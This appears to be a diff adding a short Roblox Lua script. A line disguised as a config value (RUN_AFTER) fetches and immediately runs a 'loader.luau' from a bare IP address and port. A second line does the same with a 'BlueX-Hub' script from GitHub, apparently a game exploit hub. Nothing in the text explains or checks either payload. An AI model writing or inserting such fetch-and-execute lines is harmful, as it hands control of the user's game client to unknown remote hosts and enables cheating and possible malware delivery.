@@ -1,0 +1,4 @@
+ID="f72e083c-1e55-4882-9b58-a58393754245";
+RUN_AFTER=loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dev-BlueX/BlueX-Hub/refs/heads/main/Main.lua"))()
